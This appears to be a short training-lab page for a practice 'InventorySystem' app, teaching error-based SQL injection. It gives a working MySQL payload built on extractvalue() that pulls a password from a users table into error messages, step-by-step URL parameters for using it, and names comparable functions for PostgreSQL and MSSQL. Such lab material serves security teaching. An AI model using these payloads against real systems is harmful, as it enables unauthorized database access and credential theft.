Error-based SQL Injection

Welcome to InventorySystem. Test for SQL injection vulnerabilities.

Objective

Extract data through error messages

Some applications display SQL error messages. Use functions that cause errors containing your data: ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--

MySQL: extractvalue(), updatexml(). PostgreSQL: CAST() errors. MSSQL: CONVERT() errors. Each database has functions that can leak data in errors.

Step-by-step:
  1. Trigger error: ?id=1' (see if errors are displayed)
  2. Extract data: ?id=1' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
  3. Read the password from the error message
Why it works: Error messages inadvertently display the data you're querying.
